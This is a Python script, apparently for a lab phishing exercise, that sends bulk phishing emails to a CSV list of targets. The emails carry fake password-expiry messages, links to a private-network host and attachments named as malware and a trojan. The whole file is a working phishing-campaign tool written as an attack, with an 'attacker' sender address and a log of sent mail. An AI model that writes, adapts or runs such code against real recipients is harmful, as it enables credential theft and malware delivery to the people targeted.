import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import csv
import random
import time
from dotenv import load_dotenv
 
subjects = [
    "Action Required: Update Your Password",
    "Your Password Will Expire Soon – Update Now",
    "Important Notice: Password Update Required"
]

fake_links = [
    "http://192.168.56.101:8080/reset-password",
    "http://192.168.56.101:8080/security-update",
    "http://192.168.56.101:8080/account-verification"
]

attachments = ["malicious_file.pdf", "fake_invoice.docx", "trojan_script.js"]

def send_phishing_email(sender_email, sender_password, recipient_email, recipient_name):
    # Email subject and body
    subject = random.choice(subjects)
    html_body = f"""
    <html>
    <body>
        <p>Dear {recipient_name},</p>
        <p>Your password will expire in 24 hours. Please update it immediately by clicking the link below:</p>
        <a href='{random.choice(fake_links)}'>Update Password</a>
        <p>Thank you,<br>IT Support</p>
    </body>
    </html>
    """

    # Create email
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    # Attach the HTML body
    msg.attach(MIMEText(html_body, 'html'))

    # Attach a malicious file (e.g., a fake report)
    attachment_path = random.choice(attachments)
    if os.path.exists(attachment_path):
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename={os.path.basename(attachment_path)}",
        )
        msg.attach(part)

    # Send the email
    try:
        with smtplib.SMTP('smtp.example.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            print(f"Phishing email sent successfully to {recipient_email}!")
            with open("sent_emails.log", "a") as log:
                log.write(f"Sent to {recipient_email} | Subject: {subject} | Attachment: {attachment_path}\n")
    except Exception as e:
        print(f"Error sending email to {recipient_email}: {e}")
        with open("sent_emails.log", "a") as log:
            log.write(f"Failed to send to {recipient_email}: {e}\n")

def load_targets_from_csv(csv_file):
    targets = []
    with open(csv_file, mode='r') as file:
        reader = csv.reader(file)
        next(reader)  # Skip header row
        for row in reader:
            targets.append({"email": row[0], "name": row[1]})
    return targets

if __name__ == "__main__":
    sender_email = "attacker@example.com"
    sender_password = "password"
    targets = load_targets_from_csv("targets.csv")
    for target in targets:
        send_phishing_email(sender_email, sender_password, target["email"], target["name"])
        time.sleep(5)